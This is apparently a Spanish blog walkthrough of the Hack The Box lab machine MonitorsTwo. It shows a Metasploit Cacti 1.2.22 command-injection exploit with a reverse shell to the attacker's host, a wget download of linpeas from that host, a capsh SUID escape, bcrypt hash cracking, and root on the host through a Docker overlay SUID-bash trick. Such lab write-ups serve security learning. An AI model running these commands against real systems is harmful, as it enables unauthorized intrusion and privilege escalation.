---
layout: post
title: MonitorsTwo – HTB
subtitle: Clam AV DC DNS Docker Dotnet Firejail JSON JWT Kerberos Latex Injection LFI
comments: true

---
![MoTwo](https://hyperbeast.es/wp-content/uploads/2023/05/monitorstwo-htb.jpeg)

MonitorsTwo es una emocionante máquina de dificultad fácil que se encuentra en la plataforma de Hack The Box (HTB). En esta desafiante aventura, nos enfrentaremos a una serie de pasos para lograr el acceso a la máquina.

El primer paso consiste en aprovechar una vulnerabilidad en Cacti, una herramienta de monitoreo, para abrirnos paso y obtener acceso a un contenedor. Una vez dentro del contenedor, nuestro objetivo será elevar nuestros privilegios mediante la explotación de un binario SUID. Esto nos permitirá obtener un mayor control sobre el sistema.

Una vez que hayamos logrado elevar nuestros privilegios en el contenedor, nos enfrentaremos al desafío de acceder a la máquina principal. Para lograrlo, realizaremos una minuciosa enumeración de la base de datos MySQL y obtendremos un hash. Utilizando técnicas de cracking, descifraremos el hash y obtendremos acceso a la máquina principal.

Sin embargo, la aventura no termina aquí. Nuestro siguiente objetivo será escalar nuestros privilegios en la máquina principal. Para ello, descubriremos una vulnerabilidad en Docker que nos permitirá ejecutar comandos del contenedor en la máquina principal. Aprovechando esta brecha, lograremos obtener permisos de root gracias a la bash con permisos SUID.

MonitorsTwo es un desafío estimulante que combina habilidades de explotación de vulnerabilidades, enumeración de bases de datos y conocimientos de Docker. A medida que progresamos en esta máquina, aprenderemos valiosas lecciones sobre seguridad informática y ampliaremos nuestra experiencia en el campo del hacking ético.

¡Prepárate para sumergirte en MonitorsTwo y desbloquear las etapas de esta emocionante misión!

## Enumeración
## Escaneo de puertos
Realizamos un análisis exhaustivo con el objetivo de identificar todos los puertos abiertos en la máquina. Durante este proceso, escaneamos y registramos cada puerto activo, lo que nos permite tener un panorama completo de los servicios y protocolos disponibles en el sistema.

En cuanto a una aplicación específica, un ejemplo podría ser Nmap. Nmap es una herramienta popular y ampliamente utilizada para el escaneo de puertos. Proporciona una amplia gama de opciones y técnicas de escaneo, lo que facilita la detección de puertos abiertos y servicios en una máquina remota.

Es importante destacar que el escaneo de puertos se utiliza con fines legítimos, como auditorías de seguridad o pruebas de penetración autorizadas. Se recomienda siempre obtener el consentimiento del propietario del sistema antes de realizar cualquier escaneo o evaluación de seguridad.

```javascript
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.188.45 -oG allPorts
[sudo] contraseña para mrx: 
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-02 15:02 CEST
Initiating SYN Stealth Scan at 15:02
Scanning 10.129.188.45 [65535 ports]
Discovered open port 22/tcp on 10.129.188.45
Discovered open port 80/tcp on 10.129.188.45
Completed SYN Stealth Scan at 15:02, 12.44s elapsed (65535 total ports)
Nmap scan report for 10.129.188.45
Host is up, received user-set (0.047s latency).
Scanned at 2023-05-02 15:02:25 CEST for 12s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
           Raw packets sent: 66860 (2.942MB) | Rcvd: 65624 (2.625MB)
```
Al visitar la página web, nos encontramos con un panel de inicio de sesión de Cacti. Luego, realizamos un escaneo para descubrir los puertos abiertos en la máquina. Durante este proceso, identificamos dos puertos abiertos: el puerto 22 para SSH y el puerto 80 para la web.

Para llevar a cabo el escaneo, utilizamos los siguientes parámetros:

    -p-: Escaneo de todos los puertos disponibles (65535).
    --open: Muestra únicamente los puertos abiertos.
    -sS: Realiza un escaneo TCP SYN para obtener rápidamente información sobre los puertos abiertos.
    --min-rate 5000: Establecemos una tasa mínima de 5000 paquetes por segundo para acelerar el escaneo.
    -vvv: Modo verbose que muestra la información en cuanto se descubre.
    -n: Deshabilita la resolución de DNS para evitar retrasos innecesarios.
    -Pn: Desactiva el descubrimiento de host mediante ping.
    -oG: Guarda los resultados del escaneo en un archivo de una sola línea, lo cual facilita el uso de comandos como grep, sed, awk, entre otros. Este tipo de archivo es especialmente útil para la herramienta extractPorts, que nos permite copiar directamente los puertos abiertos al portapapeles.

En el segundo escaneo, nos enfocamos en descubrir los servicios y las versiones asociadas a los puertos abiertos. Este análisis nos permitirá obtener información más detallada sobre los servicios disponibles en la máquina.

Con estos datos obtenidos, estamos un paso más cerca de comprender la configuración y las posibles vulnerabilidades de la máquina.

```javascript
❯ nmap -p22,80 -sCV 10.129.188.45 -oN targeted
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-02 15:05 CEST
Nmap scan report for 10.129.188.45
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.23 seconds
```
## Intrusión (Docker)
Si utilizamos la herramienta searchsploit, podemos descubrir que la versión del software que se encuentra en la página web presenta una vulnerabilidad conocida como RCE (Remote Code Execution). Esta vulnerabilidad permite a un atacante ejecutar código de forma remota en el sistema afectado, lo que podría comprometer su seguridad y permitir el acceso no autorizado.

En resumen, la función de searchsploit es buscar y listar exploits conocidos y vulnerabilidades en diferentes software y sistemas. En este caso particular, nos ha permitido identificar que la versión del software en la página web es vulnerable a un RCE. Esta información es valiosa para los profesionales de seguridad informática, ya que les permite estar al tanto de las vulnerabilidades existentes y tomar las medidas necesarias para proteger los sistemas afectados.

```javascript
❯ searchsploit cacti 1.2.22
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------     
Cacti v1.2.22 - Remote Command Execution (RCE)                                                                        | php/webapps/51166.py
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Realizamos una búsqueda del exploit correspondiente a la versión de Cacti en Metasploit. 

Esta acción implica utilizar la plataforma Metasploit para buscar y localizar el exploit específico que se dirige a la versión del software Cacti que hemos identificado. Metasploit es un marco de desarrollo de pruebas de penetración que incluye una amplia gama de exploits y herramientas para evaluar la seguridad de sistemas y aplicaciones.

Al buscar el exploit adecuado en Metasploit, podemos aprovechar sus capacidades para llevar a cabo pruebas de penetración controladas y evaluar la efectividad de las medidas de seguridad implementadas en el sistema afectado. Esto permite a los profesionales de seguridad informática comprender las posibles vulnerabilidades y tomar acciones correctivas para mitigar los riesgos asociados.

En resumen, buscar el exploit de la versión de Cacti en Metasploit es un paso importante para evaluar la seguridad de este software en particular y determinar si existen vulnerabilidades conocidas que podrían ser aprovechadas por atacantes malintencionados.

```javascript
msf6 > search cacti

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   0  exploit/linux/http/cacti_unauthenticated_cmd_injection  2022-12-05       excellent  Yes    Cacti 1.2.22 unauthenticated command injection
   1  exploit/unix/http/cacti_filter_sqli_rce                 2020-06-17       excellent  Yes    Cacti color filter authenticated SQLi to RCE
   2  exploit/unix/webapp/cacti_graphimage_exec               2005-01-15       excellent  No     Cacti graph_view.php Remote Command Execution
   3  exploit/windows/http/hp_sitescope_runomagentcommand     2013-07-29       manual     Yes    HP SiteScope Remote Code Execution

Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/hp_sitescope_runomagentcommand

msf6 > use 0
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > 
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set RHOSTS 10.129.188.45
RHOSTS => 10.129.188.45
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set RPORT 80
RPORT => 80
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set LHOST 10.10.14.155
LHOST => 10.10.14.155
```
Configuramos los parámetros RHOSTS, RPORT y LHOST, y procedemos a ejecutar el exploit en varias ocasiones, ya que su funcionamiento no es siempre consistente.

Al poner en marcha el exploit, se requiere establecer los valores adecuados para los parámetros RHOSTS (host remoto), RPORT (puerto remoto) y LHOST (host local). Estos parámetros permiten al exploit interactuar con el sistema objetivo de manera precisa y establecer una conexión efectiva.

Sin embargo, debido a la naturaleza de las vulnerabilidades y las diferentes configuraciones de los sistemas objetivo, es posible que el exploit no funcione de manera consistente en todos los intentos. Esto puede deberse a factores como medidas de seguridad adicionales, actualizaciones del software o configuraciones específicas del sistema.

Por lo tanto, es necesario ejecutar el exploit varias veces, realizando ajustes y modificaciones necesarios en los parámetros y en la técnica utilizada. Este enfoque de prueba iterativa nos permite explorar diferentes opciones y abordajes hasta encontrar la combinación adecuada que logre el éxito en la explotación de la vulnerabilidad.

En resumen, al poner en práctica los parámetros RHOSTS, RPORT y LHOST y ejecutar el exploit repetidamente, estamos adoptando un enfoque adaptativo para superar las posibles inconsistencias y dificultades que puedan surgir durante la explotación de la vulnerabilidad en cuestión.

```javascript
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.155:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is Cacti version 1.2.22
[*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations
[*] Enumerating local_data_id values for host_id 1
[+] Found exploitable local_data_id 6 for host_id 1
[*] Command Stager progress - 100.00% done (868/868 bytes)

whoami
www-data
```
Como podemos ver nos hemos conectado a un contenedor Docker y no a la máquina principal.

```javascript
www-data@50bca5e748b0:/var/www/html$ hostname -I
hostname -I
172.19.0.3 
www-data@50bca5e748b0:/var/www/html$ 
```
Investigamos los permisos SUID y nos resulta interesante el comando capsh.

Cuando hablamos de "mirar los permisos SUID", nos referimos a examinar los archivos y programas que tienen habilitado el bit SUID (Set User ID), lo cual les otorga privilegios especiales cuando son ejecutados por usuarios regulares. Los archivos con permisos SUID permiten a los usuarios ejecutarlos con los privilegios del propietario o del grupo propietario del archivo, en lugar de sus propios privilegios.

Durante nuestra exploración, nos llama la atención específicamente el comando capsh. Este comando es interesante debido a su capacidad para gestionar los atributos de seguridad relacionados con las capacidades del núcleo en sistemas Linux. Las capacidades del núcleo permiten un mayor control y gestión de los privilegios en un sistema operativo.

En resumen, al investigar los permisos SUID, nos centramos en identificar archivos y programas que tienen estos privilegios especiales. En este proceso, nos encontramos con el comando capsh, que es notable por su capacidad para manejar atributos de seguridad y capacidades del núcleo en sistemas Linux. Al prestar atención a este comando, podemos explorar más a fondo sus funcionalidades y comprender cómo puede influir en la seguridad y los privilegios del sistema.

```javascript
www-data@50bca5e748b0:/var/www/html$ find / -perm -4000 2>/dev/null 
find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```
Realizamos una búsqueda en [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/) y logramos obtener acceso de root en el contenedor.

Cuando mencionamos "buscar en GTFOBins", nos referimos a utilizar esta herramienta que recopila técnicas de escape y aprovechamiento de funcionalidades no seguras en binarios y comandos del sistema operativo. GTFOBins proporciona una lista de estos binarios y comandos junto con ejemplos de cómo utilizarlos para obtener privilegios de root o ejecutar comandos de forma insegura.

En nuestro caso, al buscar en GTFOBins, encontramos una técnica o método específico que nos permitió obtener acceso de root en el contenedor en el que estábamos trabajando. Esta técnica puede involucrar el aprovechamiento de una vulnerabilidad o una funcionalidad poco segura dentro del contenedor, lo que nos da el control total sobre el sistema con privilegios de root.

Es importante tener en cuenta que GTFOBins se utiliza con fines legítimos en pruebas de seguridad y actividades de hacking ético. Proporciona información valiosa para identificar posibles puntos débiles en la configuración del sistema y promover la seguridad informática al parchear o mitigar esas vulnerabilidades.

En resumen, al buscar en GTFOBins, encontramos una técnica específica que nos permitió obtener acceso de root en el contenedor. Esto nos brinda un mayor control y privilegios sobre el sistema en el que estábamos trabajando, lo que puede ser utilizado para realizar pruebas de seguridad y garantizar la protección del sistema en general.
 
## Intrusión (Maquina Principal)
 
En la raíz del sistema podemos encontrar un script en el que podremos leer un archivo SQL.

```javascript
root@50bca5e748b0:/# ls -l
ls -l
total 92
drwxr-xr-x   1 root root  4096 Mar 22 13:21 bin
drwxr-xr-x   2 root root  4096 Mar 22 13:21 boot
drwxr-xr-x   5 root root   340 May  2 12:53 dev
-rw-r--r--   1 root root   648 Jan  5 11:37 entrypoint.sh
drwxr-xr-x   1 root root  4096 Mar 21 10:49 etc
drwxr-xr-x   2 root root  4096 Mar 22 13:21 home
drwxr-xr-x   1 root root  4096 Nov 15 04:13 lib
drwxr-xr-x   2 root root  4096 Mar 22 13:21 lib64
drwxr-xr-x   2 root root  4096 Mar 22 13:21 media
drwxr-xr-x   2 root root  4096 Mar 22 13:21 mnt
drwxr-xr-x   2 root root  4096 Mar 22 13:21 opt
dr-xr-xr-x 279 root root     0 May  2 12:53 proc
drwx------   1 root root  4096 Mar 21 10:50 root
drwxr-xr-x   1 root root  4096 Nov 15 04:17 run
drwxr-xr-x   1 root root  4096 Jan  9 09:30 sbin
drwxr-xr-x   2 root root  4096 Mar 22 13:21 srv
dr-xr-xr-x  13 root root     0 May  2 12:53 sys
drwxrwxrwt   1 root root 20480 May  2 14:11 tmp
drwxr-xr-x   1 root root  4096 Nov 14 00:00 usr
drwxr-xr-x   1 root root  4096 Nov 15 04:13 var
root@50bca5e748b0:/# cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is <code>-f</code> or <code>--some-option</code>
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
root@50bca5e748b0:/# 
```

Examinamos la base de datos y descubrimos el hash de la contraseña asociada a un usuario llamado Marcus.

Al mencionar "leer la base de datos", nos referimos a revisar los registros y la información almacenada en la base de datos en busca de datos relevantes. Durante este proceso, encontramos un hash que corresponde a la contraseña del usuario Marcus. Un hash es una representación cifrada de una contraseña u otra información confidencial.

Una vez que hemos obtenido el hash de la contraseña de Marcus, podemos utilizar técnicas de cracking o descifrado para intentar obtener la contraseña en texto plano. Estas técnicas implican el uso de algoritmos y herramientas especializadas para comparar el hash con una lista de posibles contraseñas o aplicar métodos de fuerza bruta para descifrar el hash.

Es importante destacar que el acceso y el uso de datos de la base de datos deben realizarse de manera ética y cumpliendo con las leyes y regulaciones aplicables. Es fundamental obtener el consentimiento adecuado del propietario de la base de datos y utilizar la información de manera responsable y legal.

En resumen, al leer la base de datos, hemos encontrado el hash de la contraseña asociada al usuario Marcus. Esto nos proporciona información valiosa que podemos utilizar para intentar descifrar la contraseña y acceder a la cuenta de Marcus, siempre siguiendo los principios éticos y las regulaciones pertinentes.

```javascript
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+-----------------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | 
|  4 | marcus   | $2################.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |             
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+-----------------------+
```

Utilizamos la herramienta John the Ripper para descifrar el hash y obtener la contraseña original.

Cuando mencionamos "desencriptar el hash", nos referimos a aplicar técnicas de cracking o descifrado al hash de la contraseña con el fin de obtener la contraseña en su forma original. John the Ripper es una popular herramienta de descifrado de contraseñas que utiliza diversos métodos, como ataques de diccionario, fuerza bruta y análisis de patrones, para intentar descifrar hashes y recuperar las contraseñas originales.

En nuestro caso, hemos utilizado John the Ripper para procesar el hash que encontramos en la base de datos y realizar un intento de descifrado. La herramienta comparará el hash con una lista de posibles contraseñas, utilizará técnicas de fuerza bruta o aplicará métodos más sofisticados según su configuración y opciones seleccionadas.

Si John the Ripper tiene éxito en descifrar el hash, obtendremos la contraseña original asociada al usuario Marcus. Esta contraseña en texto plano nos permitirá acceder a la cuenta de Marcus y utilizarla con fines legítimos, siempre siguiendo las normas éticas y legales aplicables.

Es importante destacar que el uso de herramientas de descifrado como John the Ripper debe realizarse de manera legal y ética. Es necesario obtener el consentimiento adecuado del propietario de la cuenta o del sistema y utilizar la información obtenida de forma responsable y dentro de los límites legales establecidos.

En resumen, mediante el uso de John the Ripper, hemos aplicado técnicas de descifrado al hash para obtener la contraseña original asociada al usuario Marcus. Este proceso nos permite acceder a la cuenta de Marcus y utilizarla de manera legítima y responsable, siempre cumpliendo con las regulaciones y principios éticos correspondientes.

```javascript
❯ john --wordlist=/home/mrx/aplicaciones/rockyou.txt hash
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
fun#####ey      (?)     
1g 0:00:00:20 DONE (2023-05-02 16:21) 0.04897g/s 423.1p/s 423.1c/s 423.1C/s vectra..beckham7
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Realizamos un intento de conexión a través del protocolo SSH y logramos acceder exitosamente a la cuenta de usuario. Una vez dentro, procedemos a leer la "flag" asociada al usuario.

Al mencionar "conectarnos por SSH", nos referimos al uso del protocolo Secure Shell (SSH) para establecer una conexión segura y remota con el sistema objetivo. SSH proporciona un canal cifrado que permite la autenticación y el acceso a través de una red, generalmente utilizando nombres de usuario y contraseñas o claves de autenticación.

Después de haber autenticado correctamente y obtener acceso a la cuenta de usuario, realizamos la acción de "leer la flag". En este contexto, la "flag" se refiere a un indicador o un archivo que contiene información importante o una cadena de texto específica. Puede ser un archivo oculto o protegido, y su lectura puede ser parte de un desafío o tarea específica dentro del sistema o plataforma en la que estamos trabajando.

Al leer la flag del usuario, obtenemos acceso a esta información confidencial o indicador específico, lo cual puede ser parte de un objetivo, desafío o proceso de recolección de pruebas dentro del contexto de una evaluación de seguridad o un entorno de pruebas controlado.

Es importante destacar que cualquier acceso, lectura o manipulación de información debe realizarse de manera legal, ética y en cumplimiento de las regulaciones y acuerdos de uso aplicables. Se requiere obtener el consentimiento adecuado del propietario del sistema y utilizar la información obtenida de forma responsable y con fines legítimos.

```javascript
ssh marcus@10.129.188.45
The authenticity of host '10.129.188.45 (10.129.188.45)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:28: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.188.45' (ED25519) to the list of known hosts.
marcus@10.129.188.45's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 02 May 2023 02:22:21 PM UTC

  System load:                      0.0
  Usage of /:                       63.1% of 6.73GB
  Memory usage:                     16%
  Swap usage:                       0%
  Processes:                        240
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.188.45
  IPv6 address for eth0:            dead:beef::250:56ff:fe96:d93

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ cat user.txt 
8###################3
```
Utilizamos la herramienta LinEnum (también conocida como linpeas) para realizar un análisis exhaustivo del sistema en busca de posibles vías de explotación.

Al mencionar "pasar el linpeas", nos referimos a ejecutar LinEnum en el sistema objetivo. LinEnum es una herramienta de enumeración de Linux que se utiliza para recopilar información detallada sobre la configuración, permisos, servicios y otras características del sistema operativo.

Mediante el análisis del sistema con LinEnum, buscamos identificar posibles puntos débiles, vulnerabilidades o configuraciones inseguras que podrían ser explotadas para obtener acceso no autorizado o comprometer la seguridad del sistema. LinEnum proporciona una lista completa de las configuraciones y servicios que podrían ser objetivos potenciales para los atacantes.

Al ejecutar LinEnum, la herramienta realizará una serie de comprobaciones y análisis, como la revisión de permisos de archivos, la búsqueda de archivos SUID/SGID, la enumeración de usuarios y grupos, y la búsqueda de servicios o programas vulnerables.

El objetivo de utilizar LinEnum es obtener una visión general de la configuración y la seguridad del sistema, identificar posibles brechas o puntos débiles, y así tomar medidas proactivas para fortalecer la seguridad y corregir cualquier problema detectado.

Es importante destacar que el uso de herramientas como LinEnum debe realizarse de manera ética y legal, con el consentimiento adecuado del propietario del sistema y siguiendo las normativas y regulaciones pertinentes. El objetivo principal es mejorar la seguridad y protección del sistema, detectando y corrigiendo posibles vulnerabilidades antes de que puedan ser explotadas por atacantes malintencionados.

```javascript
marcus@monitorstwo:~$ wget http://10.10.14.94/linpeas.sh
--2023-05-02 15:12:04--  http://10.10.14.94/linpeas.sh
Connecting to 10.10.14.94:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828058 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                    100%[=================================================================================================>] 808.65K  1.38MB/s    in 0.6s    

2023-05-02 15:12:05 (1.38 MB/s) - ‘linpeas.sh’ saved [828058/828058]
```
## Escalda de privilegios (Maquina Principal)

Encontramos estas dos rutas marcadas de color rojo, 

```javascript
╔══════════╣ Mails (limit 50)              
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
```

Se trata de un mail en el que hablan de las vulnerabilidades encontradas y que deberían ser arregladas. En nuestro caso nos debemos fijar en la última. Se trata de una vulnerabilidad de Docker en la que podemos ejecutar comandos del contenedor en la máquina anfitriona.


```javascript
marcus@monitorstwo:~$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```
Debemos antes, encontrar la ruta de los contenedores mediante el comando findmnt.

```javascript
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```
En el contenedor, como root debemos poner la bash con permisos SUID.

```javascript
root@50bca5e748b0:/# chmod u+s /bin/bash 
chmod u+s /bin/bash
root@50bca5e748b0:/# ls -l /bin/bash 
ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
root@50bca5e748b0:/#
```
Y en la máquina principal ejecutamos la bash del contenedor para convertirnos en root.


```javascript
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls
bin  boot  dev  entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls -l bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 bin/bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
b4######################3204
bash-5.1# 
```
```
